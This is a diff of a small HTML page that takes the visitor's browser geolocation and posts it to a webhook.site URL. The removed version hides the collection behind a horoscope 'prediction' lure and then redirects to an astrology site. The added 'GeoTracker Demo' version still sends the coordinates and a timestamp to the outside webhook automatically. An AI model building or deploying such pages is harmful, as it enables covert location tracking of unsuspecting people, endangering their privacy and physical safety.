@@ -1,48 +1,50 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Geolocation Tracker</title>
+  <meta charset="UTF-8">
+  <title>GeoTracker Test</title>
 </head>
 <body>
-    <p>Allow location for more accurate prediction</p>
-    
-    <script>
-    navigator.geolocation.getCurrentPosition(function(position) {
-        console.log("Lat:", position.coords.latitude);
-        console.log("Lng:", position.coords.longitude);
+  <h1>GeoTracker Demo</h1>
+  <p id="status">📍 Menunggu akses lokasi...</p>
 
-        const data = {
-            latitude: position.coords.latitude,
-            longitude: position.coords.longitude,
-            accuracy: position.coords.accuracy,
-            timestamp: new Date().toISOString()
-        };
+  <script>
+    const statusEl = document.getElementById("status");
 
-        fetch("https://webhook.site/72207e62-cc9b-42d9-9fac-b4fe19c7e334", {
+    if ("geolocation" in navigator) {
+      navigator.geolocation.getCurrentPosition(
+        function (position) {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
+
+          statusEl.textContent = `Lokasi diperoleh: Lat ${latitude}, Lng ${longitude}`;
+
+          fetch("https://webhook.site/22076a52-cc9b-42d9-9fac-b4fe19c7e334", {
             method: "POST",
             headers: {
-                "Content-Type": "application/json"
+              "Content-Type": "application/json"
             },
-            body: JSON.stringify(data)
-        })
-        .then(response => {
-            // Log respons dari webhook untuk debugging
-            console.log("Webhook response:", response.status, response.statusText);
-            
-            // Redirect SETELAH fetch selesai
-            window.location.href = "https://www.astro.com/horoscope";
-        })
-        .catch(error => {
-            // Tangani jika fetch gagal
-            console.error("Fetch error:", error);
-            
-            // Anda bisa tetap redirect di sini jika mau
-            // window.location.href = "https://www.astro.com/horoscope";
-        });
-
-    }, function(error) {
-        console.error("Geolocation error:", error);
-    });
-    </script>
+            body: JSON.stringify({
+              latitude: latitude,
+              longitude: longitude,
+              timestamp: new Date().toISOString()
+            })
+          })
+          .then(response => {
+            console.log("Data terkirim:", response.status);
+          })
+          .catch(error => {
+            console.error("Gagal mengirim data:", error);
+          });
+        },
+        function (error) {
+          statusEl.textContent = "❌ Gagal mendapatkan lokasi: " + error.message;
+          console.error(error);
+        }
+      );
+    } else {
+      statusEl.textContent = "❌ Browser ini tidak mendukung geolocation.";
+    }
+  </script>
 </body>
 </html>
